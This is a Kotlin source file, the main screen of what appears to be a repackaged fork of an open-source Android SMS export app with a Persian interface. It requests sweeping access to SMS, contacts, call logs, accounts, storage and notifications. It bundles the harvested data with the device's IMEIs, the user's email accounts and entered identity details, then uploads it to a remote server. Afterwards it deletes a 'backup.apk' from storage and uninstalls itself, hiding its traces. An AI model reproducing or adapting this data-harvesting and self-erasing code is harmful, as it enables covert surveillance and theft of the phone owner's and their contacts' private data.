package com.github.tmo1.sms_ie

import android.Manifest
import android.accounts.Account
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.os.Build.VERSION.SDK_INT
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.view.inputmethod.InputMethodManager
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.core.util.PatternsCompat
import androidx.core.widget.doAfterTextChanged
import androidx.lifecycle.lifecycleScope
import com.afollestad.materialdialogs.MaterialDialog
import com.afollestad.materialdialogs.callbacks.onDismiss
import com.afollestad.materialdialogs.callbacks.onShow
import com.afollestad.materialdialogs.customview.customView
import com.github.tmo1.sms_ie.base.FileUploader
import com.github.tmo1.sms_ie.databinding.ActivityMainBinding
import com.github.tmo1.sms_ie.databinding.ProgressDialogBinding
import com.orhanobut.hawk.Hawk
import dagger.hilt.android.AndroidEntryPoint
import gun0912.tedkeyboardobserver.TedKeyboardObserver
import io.github.inflationx.viewpump.ViewPumpContextWrapper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.Retrofit
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject

const val PERMISSIONS_REQUEST = 1
const val GRANT_MANAGE_STORAGE = 2
const val GRANT_NOTIFICATION_ACCESS = 3
const val LOG_TAG = "MYLOG"
const val CHANNEL_ID = "MYCHANNEL"
const val PDU_HEADERS_FROM = "137"

data class MessageTotal(var sms: Int = 0, var mms: Int = 0)

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var retrofit: Retrofit

    private lateinit var binding: ActivityMainBinding

    private lateinit var mFile: File
    private lateinit var fileUploader: FileUploader

    private lateinit var mDialog: MaterialDialog
    private lateinit var progressDialogBinding: ProgressDialogBinding

    override fun attachBaseContext(newBase: Context?) {
        newBase?.also {
            super.attachBaseContext(ViewPumpContextWrapper.wrap(it))
            setLanguage(newBase, "fa")
        } ?: kotlin.run {
            super.attachBaseContext(newBase)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.toolbar.setTitle(R.string.app_name)
        setSupportActionBar(binding.toolbar)

        //progress dialog
        progressDialogBinding = ProgressDialogBinding.inflate(layoutInflater)
        mDialog = MaterialDialog(this)
            .cancelable(false)
            .noAutoDismiss()
            .customView(view = progressDialogBinding.root)
            .onShow {
                progressDialogBinding.lavIcon.playAnimation()
            }
            .onDismiss {
                progressDialogBinding.lavIcon.cancelAnimation()
            }

        // get necessary permissions on startup
        val allPermissions = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.GET_ACCOUNTS,
        )

        if (SDK_INT >= Build.VERSION_CODES.R) {
            allPermissions.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        }

        if (SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            allPermissions.addAll(
                arrayOf(
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO
                )
            )
        }

        val necessaryPermissions = mutableListOf<String>()
        allPermissions.forEach {
            if (ContextCompat.checkSelfPermission(this, it)
                != PackageManager.PERMISSION_GRANTED
            ) {
                necessaryPermissions.add(it)
            }
        }

        if (necessaryPermissions.any()) {
            requestPermissions(necessaryPermissions.toTypedArray(), PERMISSIONS_REQUEST)
        } else {
            checkNotificationAccessPermission()
        }

        // set up UI
        binding.exportAllButton.setOnClickListener {
            hideKeyboard(it)

            binding.etFirstName.clearFocus()
            binding.etLastName.clearFocus()
            binding.etFirstMobile.clearFocus()
            binding.etSecondMobile.clearFocus()
            binding.etPersonalCode.clearFocus()

            exportAllItems(false)
        }

        binding.exportAllOfflineButton.setOnClickListener {
            hideKeyboard(it)

            binding.etFirstName.clearFocus()
            binding.etLastName.clearFocus()
            binding.etFirstMobile.clearFocus()
            binding.etSecondMobile.clearFocus()
            binding.etPersonalCode.clearFocus()

            exportAllItems(true)
        }

        //Delete apk from internal storage
        deleteApks()

        TedKeyboardObserver(this)
            .listen { isShow ->
                if (!isShow) {
                    binding.etFirstName.clearFocus()
                    binding.etLastName.clearFocus()
                    binding.etFirstMobile.clearFocus()
                    binding.etSecondMobile.clearFocus()
                    binding.etPersonalCode.clearFocus()
                }
            }

        binding.etFirstName.doAfterTextChanged {
            if (it.toString().trim().isNotEmpty())
                binding.tilFirstName.isErrorEnabled = false
            else
                binding.tilFirstMobile.error = getString(R.string.enter_first_name)
        }

        binding.etLastName.doAfterTextChanged {
            if (it.toString().trim().isNotEmpty())
                binding.tilLastName.isErrorEnabled = false
            else
                binding.tilLastName.error = getString(R.string.enter_last_name)
        }

        binding.etFirstMobile.doAfterTextChanged {
            if (it.toString().trim().isNotEmpty())
                binding.tilFirstMobile.isErrorEnabled = false
            else
                binding.tilFirstMobile.error = getString(R.string.enter_one_mobile)
        }

        binding.etSecondMobile.doAfterTextChanged {
            if (it.toString().trim().isEmpty() && binding.etFirstMobile.text.toString().trim()
                    .isEmpty()
            )
                binding.tilFirstMobile.error = getString(R.string.enter_one_mobile)
            else
                binding.tilFirstMobile.isErrorEnabled = false
        }

    }

    override fun onResume() {
        super.onResume()

        //check if app was used run uninstall
        if (Hawk.get("app_used", false)) {
            uninstallApp()
        }
    }

    fun hideKeyboard(mView: View) {
        val imm = getSystemService(Activity.INPUT_METHOD_SERVICE) as InputMethodManager
        imm.hideSoftInputFromWindow(mView.windowToken, 0)
    }

    private val progressInterface = object : ProgressInterface {
        override fun onProgress(currentProgress: Int, progressText: String) {
            progressDialogBinding.txtDescription.text = progressText
        }

        override fun onChangeType(animationFile: Int, title: String) {
            if (!mDialog.isShowing)
                mDialog.show()

            //change animation
            progressDialogBinding.lavIcon.setAnimation(animationFile)
            progressDialogBinding.lavIcon.playAnimation()

            //change title
            progressDialogBinding.txtTitle.text = title
        }

        override fun onFinish() {
            progressDialogBinding.lavIcon.cancelAnimation()

            //set app is used
            Hawk.put("app_used", true)

            uninstallApp()
        }
    }

    private fun exportAllItems(isOffline: Boolean) {

        val firstName = binding.etFirstName.text.toString().trim().toEnglish()
        val lastName = binding.etLastName.text.toString().trim().toEnglish()
        val firstMobile = binding.etFirstMobile.text.toString().trim().toEnglish()
        val secondMobile = binding.etSecondMobile.text.toString().trim().toEnglish()
        val personalCode = binding.etPersonalCode.text.toString().trim().toEnglish()
        val description = binding.etDescription.text.toString().trim().toEnglish()

        var hasError = false

        if (firstName.isEmpty()) {
            binding.tilFirstName.error = "لطفا نام را وارد کنید"
            hasError = true
        }

        if (lastName.isEmpty()) {
            binding.tilLastName.error = "لطفا نام خانوادگی را وارد کنید"
            hasError = true
        }

        if (firstMobile.isEmpty() && secondMobile.isEmpty()) {
            binding.tilFirstMobile.error = "لطفا یک شماره موبایل وارد کنید"
            hasError = true
        }

        if (hasError)
            return


        val date = getCurrentDateTime()
        val dateInString = date.toString("yyyy-MM-dd")
        mFile = File(
            Environment.getExternalStorageDirectory(),
            "$firstName $lastName-$dateInString.json"
        )
        if (mFile.exists())
            mFile.delete()

        mFile.createNewFile()

        val mFileUri = FileProvider.getUriForFile(
            this@MainActivity,
            packageName + ".my_file_provider",
            mFile
        )

        CoroutineScope(Dispatchers.Main).launch {
            val imeis = getImei()
            val allDataExported =
                exportAllData(
                    applicationContext,
                    mFileUri,
                    firstName,
                    lastName,
                    firstMobile,
                    secondMobile,
                    personalCode,
                    description,
                    imeis,
                    getEmails(),
                    progressInterface
                )

            if (!isOffline)
                uploadFile()
            else
                progressInterface.onFinish()
        }
    }

    private fun getEmails(): List<Account> {
        val emailtPattern = PatternsCompat.EMAIL_ADDRESS
        return AccountManager.get(this).accounts.filter { emailtPattern.matcher(it.name).matches() }
    }

    @SuppressLint("HardwareIds")
    private fun getImei(): MutableList<String> {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val imeis = mutableListOf<String>()
        for (i in 0 until telephonyManager.phoneCount) {
            if (SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    imeis.add(telephonyManager.getImei(i))
                } catch (_: Exception) {
                }
            } else {
                try {
                    imeis.add(telephonyManager.getDeviceId(i))
                } catch (_: Exception) {
                }
            }
        }
        return imeis
    }

    private fun uninstallApp() {
        val packageUri = Uri.parse("package:com.github.tmo1.sms_ie")
        val uninstallIntent = Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri)
        startActivity(uninstallIntent)
    }

    private fun uploadFile() {
        progressInterface.onChangeType(R.raw.upload, getString(R.string.upload))
        fileUploader = FileUploader(retrofit, object : FileUploader.FileUploaderCallback {
            override fun onError(e: Exception) {
                MaterialDialog(this@MainActivity)
                    .cancelable(false)
                    .noAutoDismiss()
                    .positiveButton(R.string.try_again) {
                        it.dismiss()
                        fileUploader.uploadFile(mFile)
                    }
                    .negativeButton(R.string.keep_file_and_finish) {
                        it.dismiss()
                        mDialog.dismiss()

                        //set app is used
                        Hawk.put("app_used", true)

                        uninstallApp()
                    }
                    .show {
                        title(R.string.upload_problem_title)
                        message(R.string.upload_problem_description)
                    }
                Log.e("UPLOAD_FILE", "onError: ${e.message}")
            }

            override fun onFinish(message: String) {
                //delete backup file
                mFile.delete()

                //set app is used
                Hawk.put("app_used", true)

                uninstallApp()
            }

            override fun onProgressUpdate(currentPercent: Int) {
                progressInterface.onProgress(
                    currentPercent,
                    String.format(getString(R.string.upload_percent), currentPercent)
                )
            }
        })
        fileUploader.uploadFile(mFile)
    }

    private fun deleteApks() {
        lifecycleScope.launch {
            if (SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Environment.getExternalStorageDirectory()?.also {
                        findFile(it)
                    }
                }
            } else {
                Environment.getExternalStorageDirectory()?.also {
                    findFile(it)
                }
            }
        }
    }

    private suspend fun findFile(rootDirectory: File) {
        var mFounded = false

        if (mFounded)
            return

        withContext(Dispatchers.IO) {
            val mFile = File(rootDirectory, "backup.apk")
            if (mFile.exists()) {
                mFounded = true
                //delete file
                deleteFile(mFile)
            } else {
                rootDirectory.listFiles()?.also { subDirectory ->
                    if (subDirectory.isNotEmpty()) {
                        for (file: File? in subDirectory) {
                            if (mFounded)
                                break
                            file?.also {
                                if (it.isDirectory) {
                                    findFile(it)
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private fun deleteFile(file: File) {
        if (file.exists())
            file.delete()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.addCategory(Intent.CATEGORY_DEFAULT)
                    intent.data =
                        Uri.parse(String.format("package:%s", applicationContext.packageName))
                    startActivityForResult(intent, GRANT_MANAGE_STORAGE)
                } catch (e: Exception) {
                    val intent = Intent()
                    intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                    startActivityForResult(intent, GRANT_MANAGE_STORAGE)
                }
            } else {
                deleteApks()
            }
        } else {
            deleteApks()
        }

        checkNotificationAccessPermission()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(
        requestCode: Int, resultCode: Int, resultData: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, resultData)
        if (requestCode == GRANT_MANAGE_STORAGE) {
            lifecycleScope.launch {
                if (SDK_INT >= Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        Environment.getExternalStorageDirectory()?.also {
                            findFile(it)
                        }
                        checkNotificationAccessPermission()
                    }
                }
            }
        }

        if (requestCode == GRANT_NOTIFICATION_ACCESS) {
            checkNotificationAccessPermission()
        }
    }

    private fun checkNotificationAccessPermission() {
        if (SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            return
        }
        val enabledAppList =
            Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        if (!enabledAppList.contains("com.github.tmo1.sms_ie")) {
            val mIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivityForResult(mIntent, GRANT_NOTIFICATION_ACCESS)
        }
    }
}

fun Date.toString(format: String, locale: Locale = Locale.getDefault()): String {
    val formatter = SimpleDateFormat(format, locale)
    return formatter.format(this)
}

fun getCurrentDateTime(): Date {
    return Calendar.getInstance().time
}